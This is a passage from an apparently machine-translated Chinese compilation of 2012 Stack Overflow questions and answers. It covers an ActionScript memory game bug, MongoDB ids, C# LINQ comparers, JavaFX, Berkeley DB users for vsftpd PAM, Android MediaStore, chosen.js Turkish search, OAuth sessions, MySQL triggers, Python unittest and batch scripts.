at main/lose()[C:\Users\Remy\Desktop\Schoolmap\FLASH\memory1_0\main.as:253]
at flash.events::EventDispatcher/dispatchEventFunction()
at flash.events::EventDispatcher/dispatchEvent()
at flash.utils::Timer/tick() 
```

这是我的哦，如此草率的脚本；）

```
package  
    {
        // hier import ik de benodigde items.
        import flash.display.MovieClip;
        import flash.display.SimpleButton;
        import flash.display.Sprite;
        import flash.events.TimerEvent;
        import flash.text.TextField;
        import flash.text.TextFormat;
        import flash.utils.Timer;
        import flash.events.MouseEvent;
        import flash.events.Event;

        /**
         * @author Remy&Mark
         */

        public class main extends MovieClip
        {
         hier initialize ik de var's.
            var kaart1:MovieClip;
            var kaarten:Array; // ARRAY is een table.
            var pause_timer:Timer; // Timer voor tijd dat kaarten terug worden gedraaid.
            var kaart1open:Boolean; // benodige booleans en nummers
            var kaart2open:Boolean;
            var kaart1value:Number;
            var kaart2value:Number;
            var kaart1id:Number;
            var kaart2id:Number;
            var cardsRemoved:Number;// einde
            var button:Sprite;// dit is de button
            var values:Array;  //just declare it here, instead of initializing it here
            var startknop:MovieClip = new startKnop(); // maakt de startknop
            var tryAgain:MovieClip = new taKnop(); // try again.
            var score:TextField = new TextField(); // score textfield
            var result:TextField = new TextField(); // WIN of LOSE.
            var format:TextFormat = new TextFormat(); 
            var streak:Number;
            var bonus:Number;
            var klok:MovieClip = new clock();
            var gameTimer:Timer = new Timer(1000,8); 
            var retry:Boolean = false; // dit duidt aan of het voor het eerst begint of dat het wordt geretried.
            var win_timer:Timer;
            //einde

            public function main()
            {
                // dit maakt de startknop
                startknop.x = 100;
                startknop.y = 200;
                startknop.buttonMode = true;
                startknop.useHandCursor = true;
                startknop.mouseChildren = false;
                addChild(startknop);
                addEventListener(MouseEvent.CLICK, startGame);
                // einde
            }

            // deze code word opgeroepen om de game op te zetten en sommige variables goed in te stellen.
            private function startGame(e:MouseEvent):void
            {
                gameTimer.reset();
                result.text = "";
                values = new Array(2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10);
                bonus = 0;
                streak = 0;
                if (retry == false)
                {
                    removeChild(startknop);
                } else {
                    removeChild(tryAgain);
                }
                // score
                score.x = 250;
                score.y = 30;
                score.width = 250;
                score.selectable = false;
                score.text = "Score: 0";
                //score.
                format.size = 40;
                score.setTextFormat(format);
                addChild(score);
                // einde
                // game klok
                klok.x = 625;
                klok.y = 100;
                addChild(klok);
                gameTimer.addEventListener(TimerEvent.TIMER_COMPLETE, lose);
                gameTimer.addEventListener(TimerEvent.TIMER, tick);
                gameTimer.start();
                // einde
                legKaarten();
                removeEventListener(MouseEvent.CLICK,startGame);
            }

            // Hier worden de kaarten op het bord gelegd en krijgen ze een random variable.
            private function legKaarten() 
            {
                cardsRemoved = 0;
                kaart1open = false;
                kaart2open = false;
                kaart1value = 0;
                kaart2value = 0;
                kaart1id = 0;
                kaart2id = 0;
                kaarten = new Array(); // je roept hier een lege Array(table) op.
                for (var i:int = 0; i <= 17; i++ ) // (int)eger is een afgerond getal. ( geen decimalen)
                {
                    var real:int = i; 
                    var kolom:int = i;
                    var rij:int = 0;
                    kaarten.push(new Kaart1());
                    addChild(kaarten[i]);
                    kaarten[i].stop();
                    // hier worden de kolommen en rijen ingesteld.
                    if ( real > 5&&real <= 11)
                    {
                        rij++;
                        kolom = i - 6;
                    } 
                    if ( real > 11)
                    {
                        rij = rij + 2;
                        kolom = i - 12;
                    }
                    //einde
                    var randIndex:int = Math.floor(Math.random() * (values.length - 1)) // hier worden de values geconfigureerd
                    kaarten[i].id = i;
                    kaarten[i].value = values[randIndex]; // dit geeft een kaart een random value uit de Array.
                    values.splice(randIndex, 1);
                    kaarten[i].x = 200+(kolom * 80);
                    kaarten[i].y = 100 + (rij * 150);
                    kaarten[i].width = 75;
                    kaarten[i].height = 125;
                    kaarten[i].addEventListener(MouseEvent.CLICK, omdraaien);
                }
            }

            // deze functie draait de kaarten om om te kijken of de kaarten matchen.
            private function omdraaien(e:MouseEvent):void
            {
                  var geklikteKaart:MovieClip = e.currentTarget as MovieClip; //e.target is de klik target.
                if (geklikteKaart.currentFrame == 1 && kaart1open == false)
                {
                    if (kaart1open == false)
                    {
                        geklikteKaart.gotoAndStop(geklikteKaart.value);
                        kaart1open = true;
                        kaart1value = geklikteKaart.value;
                        kaart1id = geklikteKaart.id;
                    }
                }
                else if(geklikteKaart.currentFrame == 1 && kaart1open == true && kaart2open == false)
                {
                    geklikteKaart.gotoAndStop(geklikteKaart.value);
                    kaart2open = true;
                    kaart2value = geklikteKaart.value;
                    kaart2id = geklikteKaart.id;
                }
                if (kaart1open == true && kaart2open == true && kaart1value == kaart2value)
                {
                    pause_timer = new Timer(250, 1);
                    pause_timer.addEventListener(TimerEvent.TIMER_COMPLETE, removeKaarten);
                    pause_timer.start();
                }
                else if (kaart1open == true && kaart2open == true && kaart1value != kaart2value)
                {
                    pause_timer = new Timer(250, 1);
                    pause_timer.addEventListener(TimerEvent.TIMER_COMPLETE, resetKaarten);
                    pause_timer.start();
                }
            }
            private function removeKaarten(e:TimerEvent):void
            {
                removeChild(kaarten[kaart1id]);
                removeChild(kaarten[kaart2id]);
                streak ++;
                cardsRemoved ++;
                kaart1open = false;
                kaart2open = false;
                kaart1value = 0;
                kaart2value = 0;
                kaart1id = 0;
                kaart2id = 0;
                if (streak > 1)
                {
                    bonus = bonus + 50;
                }
                if (cardsRemoved == 9)
                {
                    gameTimer.stop();
                    win_timer = new Timer(500, 1);
                    win_timer.addEventListener(TimerEvent.TIMER_COMPLETE, win);
                    win_timer.start();
                    pause_timer.removeEventListener(TimerEvent.TIMER_COMPLETE, resetKaarten);
                    gameTimer.removeEventListener(TimerEvent.TIMER,tick);
                }
                else if (gameTimer.currentCount == 60)
                {
                    gameTimer.removeEventListener(TimerEvent.TIMER,tick);
                }
                score.selectable = false;
                score.text = "Score: " + (cardsRemoved * 100 + bonus);
                format.size = 40;
                score.setTextFormat(format);
                //pause_timer.removeEventListener(TimerEvent.TIMER_COMPLETE, removeKaarten);
            }
            private function resetKaarten(e:TimerEvent):void
            {
                kaarten[kaart1id].gotoAndStop(1);
                kaarten[kaart2id].gotoAndStop(1);
                kaart1open = false;
                kaart2open = false;
                kaart1value = 0;
                kaart2value = 0;
                kaart1id = 0;
                kaart2id = 0;
                streak = 0;
                pause_timer.removeEventListener(TimerEvent.TIMER_COMPLETE, resetKaarten);
            }
            private function tick(e:TimerEvent):void
            {
                klok.wijzer.rotation += 360 / gameTimer.repeatCount;
            }
            private function lose(e:TimerEvent):void
            {
                retry = true;
                removeChild(klok);
                removeChild(score);
                // tekst voor verlies
                result.x = 300;
                result.y = 150;
                result.width = 250;
                result.selectable = false;
                result.text = "YOU SUCK!";
                format.size = 40;
                result.setTextFormat(format);
                addChild(result);
                // einde
                // dit maakt de try again knop.
                tryAgain.x = 100;
                tryAgain.y = 200;
                tryAgain.buttonMode = true;
                tryAgain.useHandCursor = true;
                tryAgain.mouseChildren = false;
                addChild(tryAgain);
                addEventListener(MouseEvent.CLICK, startGame);
                // einde
                // hier worden de kaarten verwijderd.
                for (var r:int = 0; r < 18; r++)
                {
                    removeChild(kaarten[r]);
                    values.splice(kaarten[r], 1)
                }
                //einde
            }
            private function win(e:TimerEvent):void
            {
                retry = true;
                removeChild(klok);
                removeChild(score);
                // tekst voor verlies
                result.x = 200;
                result.y = 150;
                result.width = 550;
                result.selectable = false;
                result.text = "YOU ARE A WINNER!";
                format.size = 40;
                result.setTextFormat(format);
                addChild(result);
                // einde
                // dit maakt de try again knop.
                tryAgain.x = 100;
                tryAgain.y = 200;
                tryAgain.buttonMode = true;
                tryAgain.useHandCursor = true;
                tryAgain.mouseChildren = false;
                addChild(tryAgain);
                addEventListener(MouseEvent.CLICK, startGame);
                // einde
                // hier worden de kaarten verwijderd.
                for (var r:int = 0; r < 18; r++)
                {
                    if (kaarten[r].value != null)
                    {
                        removeChild(kaarten[r]);
                        values.splice(kaarten[r], 1)
                    }
                }
                //einde
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:06:25.230

`DisplayObject`从 an中删除 a时，`DisplayObjectContainer`如果您尝试删除的对象是`null`或不是子对象，则会收到错误消息。您需要对此进行测试。

下面的示例循环遍历“karten”数组，检查每个对象是否存在以及它是否是`this`. 如果是这样，它将删除子项，否则在移动到数组中的下一项之前什么都不做。

```
for (var i:int = 0; i < kaarten.length; i++) {
    if (kaarten[i] && this.contains(kaarten[i])) {
        this.removeChild(kaarten[i]);
    }
} 
```

# python - 如何将_id设置为32位整数？

> ID：13343119
> 
> 赞同：1
> 
> 时间：2012-11-12T11:43:52.980
> 
> 标签：python, mongodb, pymongo

我目前正在将数据拉入 MongoDB，稍后需要将这些数据拉入单独的应用程序。此应用程序要求 _id 字段为 32 位整数。

> 确保将结果文档中的 _id 属性显式设置为唯一的 32 位整数。 [来源](http://blogs.esri.com/esri/arcgis/2012/07/16/integrate-big-data-with-the-arcgis-system-using-a-plug-in-data-source/)

我正在使用 pymongo 将文档插入集合中。

```
def parse_tweet(in_t):
    t = {}
    t["text"] = in_t["text"]
    t["shape"] = in_t["coordinates"]["coordinates"][0], in_t["coordinates"]["coordinates"][1]
    return t 
```

这给了我预期的文件：

```
{
  "_id" : ObjectId("50a0de04f26afb14f4bba03d"),
  "text" : "hello world",
  "shape" : [144.9557834, -37.8208589],
} 
```

如何将 _id 值显式设置为 32 位整数？
我不打算存储超过 600 万份文档。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T11:46:13.210

只需生成一个 id 并将其传递。Id 可以是任何东西（数组除外）。

```
def parse_tweet(in_t):
    t = {}
    t["_id"] = get_me_an_int32_id
    t["text"] = in_t["text"]
    t["shape"] = in_t["coordinates"]["coordinates"][0], in_t["coordinates"]["coordinates"][1]
    return t 
```

你必须自己照顾它的独特性。MongoDB 只会确保您不存储重复值。但是你在哪里获得独特的价值——那是你的问题。

这里有一些想法：[如何制作一个自动增量字段](http://www.mongodb.org/display/DOCS/How+to+Make+an+Auto+Incrementing+Field)。

# c# - 与自定义比较器相交的列表返回空集

> ID：13343124
> 
> 赞同：-1
> 
> 时间：2012-11-12T11:44:10.713
> 
> 标签：c#, linq, collections

我正在使用 intersect 与列表进行比较，如下所示：（以 POCO Car 为例）

```
IEnumerable<Car> updatedCars = CarsList.Intersect(dbCarsList, carsComperator); 
```

我将carsComperator定义如下

```
public bool Equals(Car x, Car y)
{
    if (object.ReferenceEquals(x, y)) return true;
    if (x == null || y == null) return false;
    return (x.Id == y.Id);
}

public int GetHashCode(Car car)
{
    return car.Id.GetHashCode();  // Id is Guid
} 
```

但是当 Intersect 命令运行时，它什么也没带来。
我假设该程序没有通过我的比较器，因为在那里我的断点没有停止。

知道我在做什么错吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T11:51:23.303

尝试遍历结果列表。如果 Intersect 使用 yield return 机制，它只会在结果 IEnumerable 被迭代时才开始比较。

# java - 在 Swing 项目中使用 JavaFx 应用程序

> ID：13343129
> 
> 赞同：0
> 
> 时间：2012-11-12T11:44:36.800
> 
> 标签：java, swing, awt, javafx-2, javafx

我必须在 java windows 应用软件中浏览 Html 文件。为此，我正在使用 JEditorPane 控件，但它不支持 HTML 的某些标签，并且格式在 JEditorPane 中令人不安。我在网上搜索过，网上建议我使用 JavaFXApplication 控件。在 C# 中有一个控件 WebBrowser 可以轻松地以相同格式显示 html 文件。是否也可以在 java 中显示带有所有支持标签的 html 文件。你能给我建议我的代码中的控件或错误吗？我正在使用以下代码。

```
 try
 { 
  File htmlfile= new File("path of the html file");
  JEditorPane htmlPane= new JEditorPane();
  htmlPane.setEditable(false);
  htmlPane.setContentType("text/html");
  htmlPane.setPage(htmlfile.toURI().toURL());
  JScrollPane jsp= new JScrollPane(htmlPane);
  add(jsp);
  }

  catch(Exception ex)
   {

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:10:42.537

如果我正确理解您的问题，则您正在尝试查看 HTML SOURCE 而不是尝试实现 Web 浏览器。

如果是这种情况，您可以使用 JavaFX 的 HTML 编辑器**，假设您使用 Java 6 和 JavaFX 或包含 JavaFX 的 Java 7**

[这是使用JFXPanel](http://docs.oracle.com/javafx/2/api/javafx/embed/swing/JFXPanel.html)和[HTMLEditor](http://docs.oracle.com/javafx/2/api/javafx/scene/web/HTMLEditor.html)使用 javafx 包的简短示例：

```
public class JavaFXDemo {

    private static void initAndShowGUI() {
        JFrame frame = new JFrame("HTML Editor");
        final JFXPanel fxPanel = new JFXPanel();
        frame.add(fxPanel);
        frame.setSize(600, 400);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                final HTMLEditor htmlEditor = new HTMLEditor();
                Scene scene = new Scene(htmlEditor);
                fxPanel.setScene(scene);
            }
        });
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                initAndShowGUI();
            }
        });
    }
} 
```

# ftp - 将用户添加到 Berkeley db 以进行 PAM 身份验证

> ID：13343133
> 
> 赞同：2
> 
> 时间：2012-11-12T11:44:49.140
> 
> 标签：ftp, berkeley-db, pam

我正在尝试将用户添加到 Berkeley db 数据库中以进行 vsftpd 的 PAM 身份验证。该数据库最初是由 db_load 实用程序从用户名和密码的文本文件创建的。

```
db_load -T -t hash -f vusers.txt vsftpd-virtual-user.db 
```

这些用户的 PAM 身份验证工作正常。我编写了将用户添加到该数据库的 c++ 应用程序。

```
 int ret = -1;
  char *description = "user5";
  char *pass = "password5";

// Database open omitted for clarity
  Dbt data(pass, strlen(pass) + 1);
  Dbt key(description, strlen(description) + 1);

  ret = db.put(NULL, &key, &data, DB_NOOVERWRITE); 
```

操作成功通过，但 PAM 无法识别新添加的用户。我检查了数据库的内容，发现最初添加的数据与我的应用程序添加的数据不同：它包含一些在用户名和密码后面尾随的二进制数据。PAM db 数据格式是什么？如何解决问题？

这是添加新主菜之前的 db_dump 输出

```
bash-4.2$ db_dump -d a /etc/vsftpd_virtual-users.db
In-memory DB structure:
hash: 0x90000 (open called, read-only)
meta_pgno: 0
h_ffactor: 0
h_nelem: 2
h_hash: 0xb770bb00
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
page 0: hash metadata: LSN [0][1]: level 0
        magic: 0x61561
        version: 9
        pagesize: 4096
        type: 8
        metaflags 0
        keys: 0 records: 0
        free list: 0
        last_pgno: 2
        flags: 0
        uid: d 0 8e 0 7 8 0 0 9d 2b 10 be 8a 11 0 0 0 0 0 0
        max_bucket: 1
        high_mask: 0x1
        low_mask:  0
        ffactor: 0
        nelem: 2
        h_charkey: 0x5e688dd1
        spare points: 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
page 1: hash: LSN [0][1]: level 0
        prev:    0 next:    0 entries:    2 offset: 4085
        [000] 4091 len:   4 data: usr2
        [001] 4085 len:   5 data: pass2
page 2: hash: LSN [0][1]: level 0
        prev:    0 next:    0 entries:    2 offset: 4085
        [000] 4091 len:   4 data: usr1
        [001] 4085 len:   5 data: pass1 
```

在添加了“user5”和“pass5”的新主菜之后

```
bash-4.2$ db_dump -d a 1vsftpd_virtual-users.db 
In-memory DB structure:
hash: 0x90000 (open called, read-only)
meta_pgno: 0
h_ffactor: 0
h_nelem: 3
h_hash: 0xb7675b00
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
page 0: hash metadata: LSN [0][1]: level 0
        magic: 0x61561
        version: 9
        pagesize: 4096
        type: 8
        metaflags 0
        keys: 0 records: 0
        free list: 0
        last_pgno: 2
        flags: 0
        uid: d 0 8e 0 7 8 0 0 9d 2b 10 be 8a 11 0 0 0 0 0 0
        max_bucket: 1
        high_mask: 0x1
        low_mask:  0
        ffactor: 0
        nelem: 3
        h_charkey: 0x5e688dd1
        spare points: 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
page 1: hash: LSN [0][1]: level 0
        prev:    0 next:    0 entries:    2 offset: 4085
        [000] 4091 len:   4 data: usr2
        [001] 4085 len:   5 data: pass2
page 2: hash: LSN [0][1]: level 0
        prev:    0 next:    0 entries:    4 offset: 4072
        [000] 4091 len:   4 data: usr1
        [001] 4085 len:   5 data: pass1
        [002] 4079 len:   5 data: 0x750x730x720x3500
        [003] 4072 len:   6 data: 0x700x610x730x730x3500 
```

# android - 从 Mediastore 检索图像

> ID：13343134
> 
> 赞同：0
> 
> 时间：2012-11-12T11:44:50.437
> 
> 标签：android

我正在尝试从 Mediastore.Images.Media 检索图像我总是让光标为空。请建议如何解决该问题。提前致谢

```
Uri contenturi = Images.Media.getContentUri("phoneStorage");
    String[] mprojection = { MediaStore.Images.Media.DATA };
    String mselection = null;
    String[] mselectionArgs = null;
    String msortOrder ="date_added DESC";
    Cursor mcursor = managedQuery(contenturi, mprojection, mselection, mselectionArgs, msortOrder); 
```

当我检查它说 mcursor 为空时，我尝试将 uri 更改为外部存储也尝试没有排序顺序。但它仍然返回null。请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:15:14.637

哥们试试这个代码，

```
Intent intent = new Intent();
intent.setType("image/*");
intent.setAction(Intent.ACTION_GET_CONTENT);    
startActivityForResult(Intent.createChooser(intent,getResources().getString(R.string.accept)),1); 
```

现在只需使用`onActivityResult` 方法从图库中获取图像。

# jquery - 搜索多语言支持 selected.js

> ID：13343136
> 
> 赞同：0
> 
> 时间：2012-11-12T11:45:09.197
> 
> 标签：jquery, jquery-chosen

我想搜索栏执行所有单词。包括土耳其语字母（Ö、Ç、İ、Ş、Ğ、Ü）。如何为这些单词展开选择的搜索栏？

例如：我会搜索“istanbul”，但它说找不到“İstanbul”，因为“i”是小写的。

我该如何解决？

[https://github.com/harvesthq/chosen](https://github.com/harvesthq/chosen)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-21T21:37:35.520

我添加了一些代码来解决所选库的问题。

```
// Added following lines to 304 - 305 lines for version 1.0.0
var letters = { "İ": "[İi]", "I": "[Iı]", "Ş": "[Şş]", "Ğ": "[Ğğ]", "Ü": "[Üü]", "Ö": "[Öö]", "Ç": "[Çç]", "i": "[İi]", "ı": "[Iı]", "ş": "[Şş]", "ğ": "[Ğğ]", "ü": "[Üü]", "ö": "[Öö]", "ç": "[Çç]" };
escapedSearchText = escapedSearchText.replace(/(([İIŞĞÜÇÖiışğüçö]))/g, function(letter){ return letters[letter]; }); 
```

如需完整解决方案，您可以查看以下链接：[https ://gist.github.com/hkulekci/7091324](https://gist.github.com/hkulekci/7091324)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T16:35:04.337

我解决了这个问题。底部的解决方案；

```
String.prototype.turkce=function() {
  var str = [];
  for(var i = 0; i < this.length; i++) {
  var ch = this.charCodeAt(i);
  var c = this.charAt(i);
  if(ch == 105) str.push('İ');
  else if(ch == 305) str.push('I');
  else if(ch == 287) str.push('Ğ');
  else if(ch == 252) str.push('Ü');
  else if(ch == 351) str.push('Ş');
  else if(ch == 246) str.push('Ö');
  else if(ch == 231) str.push('Ç');
  else if(ch >= 97 && ch <= 122) str.push(c.toUpperCase());
  else str.push(c);
  }
  return str.join('');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-08T20:09:23.940

如果你想用特殊字符搜索......

1.  **打开 selected.jquery.js**
2.  **用以下代码替换方法** `Chosen.prototype.winnow_results = function()`。（注意`removeDiacritics()`必须是从字符串中删除特殊字符的实现）

* * *

```
Chosen.prototype.winnow_results = function() {
      var found, option, optionHTML, part, parts, regex, regexAnchor, result, result_id, results, searchText, startpos, text, zregex, _i, _j, _len, _len2, _ref;
      this.no_results_clear();
      results = 0;
      searchText = this.search_field.val() === this.default_text ? "" : $('<div/>').text($.trim(this.search_field.val())).html();
      searchText = searchText.removeDiacritics();
      regexAnchor = this.search_contains ? "" : "^";
      regex = new RegExp(regexAnchor + searchText.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&"), 'i');
      zregex = new RegExp(searchText.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&"), 'i');
      _ref = this.results_data;
      for (_i = 0, _len = _ref.length; _i < _len; _i++) {
        option = _ref[_i];
        optionHTML = option.html.removeDiacritics();
        if (!option.disabled && !option.empty) {
          if (option.group) {
            $('#' + option.dom_id).css('display', 'none');
          } else if (!(this.is_multiple && option.selected)) {
            found = false;
            result_id = option.dom_id;
            result = $("#" + result_id);
            if (regex.test(optionHTML)) {
              found = true;
              results += 1;
            } else if (optionHTML.indexOf(" ") >= 0 || optionHTML.indexOf("[") === 0) {
              parts = option.html.replace(/\[|\]/g, "").split(" ");
              if (parts.length) {
                for (_j = 0, _len2 = parts.length; _j < _len2; _j++) {
                  part = parts[_j];
                  part = part.removeDiacritics();
                  if (regex.test(part)) {
                    found = true;
                    results += 1;
                  }
                }
              }
            }
            if (found) {
              if (searchText.length) {
                startpos = optionHTML.search(zregex);
                text = option.html.substr(0, startpos + searchText.length) + '</em>' + option.html.substr(startpos + searchText.length);
                text = text.substr(0, startpos) + '<em>' + text.substr(startpos);
              } else {
                text = option.html;
              }
              result.html(text);
              this.result_activate(result);
              if (option.group_array_index != null) {
                $("#" + this.results_data[option.group_array_index].dom_id).css('display', 'list-item');
              }
            } else {
              if (this.result_highlight && result_id === this.result_highlight.attr('id')) {
                this.result_clear_highlight();
              }
              this.result_deactivate(result);
            }
          }
        }
      }
      if (results < 1 && searchText.length) {
        return this.no_results(searchText);
      } else {
        return this.winnow_results_set_highlight();
      }
}; 
```

**这是我自己的实现**（`removeDiacritics()`这是针对西班牙特殊字符的）

```
String.prototype.removeDiacritics = function() {
    var diacritics = [
        [/[\300-\306]/g, 'A'],
        [/[\340-\346]/g, 'a'],
        [/[\310-\313]/g, 'E'],
        [/[\350-\353]/g, 'e'],
        [/[\314-\317]/g, 'I'],
        [/[\354-\357]/g, 'i'],
        [/[\322-\330]/g, 'O'],
        [/[\362-\370]/g, 'o'],
        [/[\331-\334]/g, 'U'],
        [/[\371-\374]/g, 'u'],
        [/[\321]/g, 'N'],
        [/[\361]/g, 'n'],
        [/[\307]/g, 'C'],
        [/[\347]/g, 'c'],
    ];
    var s = this;
    for (var i = 0; i < diacritics.length; i++) {
        s = s.replace(diacritics[i][0], diacritics[i][1]);
    }
    return s;
}; 
```

# php - 将用户的 oauth 密钥保存在 cookie 中

> ID：13343138
> 
> 赞同：1
> 
> 时间：2012-11-12T11:45:14.797
> 
> 标签：php, cookies, twitter, oauth

我使用 oauth 将我的网络应用程序连接到 twitter。它工作正常，但我需要定期重新授权应用程序。

我将密钥保存在会话中，但是当用户关闭页面时，这似乎被清除了。

我应该将密钥保存在额外的 cookie 中吗？

```
function access_token($tmhOAuth) {
  $tmhOAuth->config['user_token']  = $_SESSION['oauth']['oauth_token'];
  $tmhOAuth->config['user_secret'] = $_SESSION['oauth']['oauth_token_secret'];

  $code = $tmhOAuth->request(
    'POST',
    $tmhOAuth->url('oauth/access_token', ''),
    array(
      'oauth_verifier' => $_REQUEST['oauth_verifier']
    )
  );

  if ($code == 200) {
    $_SESSION['access_token'] = $tmhOAuth->extract_params($tmhOAuth->response['response']);
    unset($_SESSION['oauth']);
    header('Location: ' . tmhUtilities::php_self());
  } else {
    outputError($tmhOAuth);
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T11:52:30.350

您可以将密钥保存在 cookie 中，确保将 cookie 的有效期设置足够长的时间，或者将它们存储在持久性数据库中的时间。

# mysql - 存储过程中是否有此触发器的等效项

> ID：13343139
> 
> 赞同：0
> 
> 时间：2012-11-12T11:45:16.407
> 
> 标签：mysql

我一直在专用服务器上使用这个 MySQL 触发器，所以每次更新表时，它都会计算一个新的总和并更新另一个表：

```
delimiter |
CREATE TRIGGER after_insert_rep_points AFTER INSERT ON users_reputation
FOR EACH ROW
BEGIN
DECLARE new_total INT(10);
SELECT SUM(rep_points) INTO new_total FROM users_reputation
WHERE user_id = NEW.user_id;
UPDATE users SET rep_total = new_total WHERE user_id = NEW.user_id;
END
|
delimiter ; 
```

我现在需要在共享主机环境中使用它，但不幸的是，由于安全预防措施，我不能在共享环境中拥有 SUPER USER 权限，这是触发器所必需的。我不明白这一点。我认为每个人都应该能够使用触发器。

我对存储过程并不了解，事实上我没用，但我想知道这个查询是否可以使用一个来执行，如果可以，任何人都可以给我任何指示吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T11:51:28.247

编写触发器的人显然 SQL 技能非常有限——整个主体可以表示为一个简单的查询：

```
UPDATE users SET
rep_total = (SELECT SUM(rep_points) 
    FROM users_reputation 
    WHERE user_id = users.user_id)
WHERE user_id = ?; -- "?" is NEW.user_id inside the trigger. You must provide it 
```

您不需要存储过程 - 只需运行此查询。

# python - 如何使用 unittest.main 运行测试套件

> ID：13343142
> 
> 赞同：1
> 
> 时间：2012-11-12T11:45:43.817
> 
> 标签：python, unit-testing, python-2.7

> **可能重复：**
> [Python unittest - 使用自定义 TestSuite 调用 unittest.main()](https://stackoverflow.com/questions/3772074/python-unittest-invoke-unittest-main-with-a-custom-testsuite)

我有一个用例如创建的测试套件

```
suite = unittest.TestSuite()
suite.addTest(module1.MyTest("test_simple"))
suite.addTest(module2.MyTest("test_simple")) 
```

并且需要使用`unitest.main()`. 尝试时`unitest.main(suite)`根本不运行任何测试。我怎么能在`unittest.main()`没有电话`test.TextTestRunner`或类似的情况下做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:19:45.703

您不能将 a 传递`TestSuite`给 main，请查看[`unittest.main.TestProgram`](http://hg.python.org/cpython/file/6a6ad09faad2/Lib/unittest/main.py#l81)（`unittest.main`实际上是）的构造函数以及此类的工作原理。如果有的话，第一个参数是模块名称，而不是测试套件。

`main()`实际上从 获取它的参数`sys.argv`，因为它实际上打算从命令行使用，而不是从程序中使用。为了方便起见，这样做很常见。

# text - 使用批处理的随机文本行

> ID：13343144
> 
> 赞同：1
> 
> 时间：2012-11-12T11:45:59.890
> 
> 标签：text, random, batch-file, line

如何从文本文件中随机选择一行文本并将其设置在要使用的变量中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T03:05:04.273

下面的 Batch 程序是 Eitan 的解决方案，稍作修改以运行得更快：

```
@echo off
setlocal EnableDelayedExpansion
set INPUT_FILE="test.txt"

:: # Count the number of lines in the text file and generate a random number
for /f "usebackq" %%a in (`find /V /C "" ^< %INPUT_FILE%`) do set lines=%%a
set /a randnum=%RANDOM% * lines / 32768 + 1, skiplines=randnum-1

:: # Extract the line from the file
set skip=
if %skiplines% gtr 0 set skip=skip=%skiplines%
for /f "usebackq %skip% delims=" %%a in (%INPUT_FILE%) do set "randline=%%a" & goto continue
:continue

echo Line #%randnum% is:
echo/!randline! 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T21:26:27.323

就像StackOverflow 中已经提到的[一样](https://stackoverflow.com/questions/5777400/how-to-use-random-in-batch-script)`%RANDOM%`，它扩展为 0 到 32767 之间的随机数。

您可以使用此机制生成随机行号。但是，要使其成为有效的行号，您必须通过输入文本文件中的行数对其进行规范化。

这是一个简单的脚本，展示了如何做到这一点：

```
@echo off
setlocal enabledelayedexpansion
set INPUT_FILE="test.txt"

:: # Count the number of lines in the text file and generate a random number
set lines=0
for /f "usebackq" %%a in (%INPUT_FILE%) do set /a lines+=1
echo %RANDOM% >nul
set /a randnum=%RANDOM% * !lines! / 32768 + 1

:: # Extract the line from the file
set lines=0
for /f "usebackq tokens=*" %%a in (%INPUT_FILE%) do (
    set /a lines+=1
    if !lines!==!randnum! set randline=%%a
)

echo Line #!randnum! is:
echo.!randline! 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:17:23.623

这是另一种方法。它从命令行读取文件名并使用`FOR /L`循环来获取计算的行号：

```
@ECHO OFF
FOR /F "" %%I IN ('FIND /C /V "" ^<%1') DO SET /A lines=%%I
SET /A skip=%RANDOM%%%lines
<%1 (
  FOR /L %%I IN (1,1,%skip%) DO (
    SET /P line=
  )
  SET line=
  SET /P line=
)
ECHO(%line% 
```

循环只是获取文件中的`FOR /F`行数（该方法是从[@Aacini 的答案](https://stackoverflow.com/a/13355038/297408)中借用的）。

然后一个相当简单的公式计算文件中要跳过的行数。

接下来，读取文件。循环仅使用一条指令`FOR /L`消耗指定数量的行。`SET /P`在循环之后，另一个`SET /P`命令读取最终 ECHO 的行。

上面的实现只是为了展示基本思想。这并非没有问题，但其中一些问题很容易解决：

1.  没有测试是否确实提供了参数。如果不存在，脚本将中断。您可以在脚本开头添加必要的检查，如下所示：

    ```
    IF "%~1"=="" GOTO :EOF 
    ```

    如果没有参数，此命令通过将控件发送到脚本末尾 ( `GOTO :EOF`) 来终止脚本。

2.  指定的文件可能不存在。同样，您可以在开始时进行测试，在验证是否提供了参数之后，在必要时终止脚本：

    ```
    IF NOT EXIST %1 GOTO :EOF 
    ```

3.  如果文件为空，则`lines`will be`0`和使用它的后续表达式将遇到除以零错误。因此，您还需要测试生成的行数（如果行数确实为 0，则阻止脚本进一步运行）。您可以通过在`FOR /F`循环之后添加以下行来做到这一点：

    ```
    IF %lines%==0 GOTO :EOF 
    ```

